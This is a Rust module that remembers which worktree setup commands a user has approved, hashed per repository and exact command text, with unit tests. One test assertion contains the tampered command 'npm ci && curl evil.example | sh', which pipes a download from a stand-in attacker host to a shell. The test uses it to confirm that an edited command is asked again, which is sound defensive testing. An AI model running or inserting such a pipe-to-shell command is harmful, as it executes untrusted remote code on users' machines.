//! The worktree recipe `setup` commands the user accepted: one SHA-256 per (repository, exact
//! command text), kept in the app's own config folder, never in the repository (a recipe cannot
//! accept itself). An edited command, or the same one in another repository, is asked again.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

/// In the app's config folder.
pub const TRUST_FILE: &str = "recipe-trust.json";

#[derive(Serialize, Deserialize, Default)]
struct Stored {
    accepted: BTreeSet<String>,
}

/// The accepted commands; without a file (tests), kept in memory only.
#[derive(Default)]
pub struct Trust {
    file: Option<PathBuf>,
    accepted: BTreeSet<String>,
}

/// What is remembered for `command` in the repository whose main checkout is `repo`: both texts,
/// each with its length first (no two pairs give the same bytes).
pub fn key(repo: &str, command: &str) -> String {
    let mut hasher = Sha256::new();
    for text in [repo, command] {
        hasher.update((text.len() as u64).to_le_bytes());
        hasher.update(text.as_bytes());
    }
    hasher.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

impl Trust {
    /// The commands accepted so far, from `dir`. A missing or unreadable file: none.
    pub fn load(dir: &Path) -> Self {
        let file = dir.join(TRUST_FILE);
        let stored: Stored = std::fs::read_to_string(&file).ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default();
        Trust { file: Some(file), accepted: stored.accepted }
    }

    pub fn accepted(&self, repo: &str, command: &str) -> bool {
        self.accepted.contains(&key(repo, command))
    }

    /// Remembers `command` for `repo` (written at once).
    pub fn accept(&mut self, repo: &str, command: &str) {
        if !self.accepted.insert(key(repo, command)) {
            return;
        }
        let Some(file) = &self.file else { return };
        let text = serde_json::to_vec_pretty(&Stored { accepted: self.accepted.clone() }).expect("trust serializes");
        let written = file.parent().map_or(Ok(()), std::fs::create_dir_all).and_then(|()| {
            // Written aside, then renamed: never a half-written file.
            let aside = file.with_extension("json.tmp");
            std::fs::write(&aside, text).and_then(|()| std::fs::rename(&aside, file))
        });
        if let Err(e) = written {
            eprintln!("{}: {e}", file.display());
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_command_is_accepted_for_one_repository_and_one_text() {
        let dir = std::env::temp_dir().join(format!("tcanvas-trust-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let mut trust = Trust::load(&dir);
        assert!(!trust.accepted("/home/me/shop", "npm ci"), "nothing accepted yet");
        trust.accept("/home/me/shop", "npm ci");
        assert!(trust.accepted("/home/me/shop", "npm ci"));
        // Remembered across runs, in the app's folder.
        let again = Trust::load(&dir);
        assert!(again.accepted("/home/me/shop", "npm ci"));
        assert!(std::fs::read_to_string(dir.join(TRUST_FILE)).unwrap().contains(&key("/home/me/shop", "npm ci")));
        // An edited command, or another repository: asked again.
        assert!(!again.accepted("/home/me/shop", "npm ci && curl evil.example | sh"));
        assert!(!again.accepted("/home/me/shop", "npm ci "));
        assert!(!again.accepted("/home/me/blog", "npm ci"));
        // The texts cannot be shifted from one to the other.
        assert_ne!(key("/a", "b c"), key("/a b", "c"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn an_unreadable_store_accepts_nothing() {
        let dir = std::env::temp_dir().join(format!("tcanvas-trust-bad-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join(TRUST_FILE), "{ not json").unwrap();
        assert!(!Trust::load(&dir).accepted("/home/me/shop", "npm ci"));
        let mut memory = Trust::default();
        memory.accept("/r", "x");
        assert!(memory.accepted("/r", "x"));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
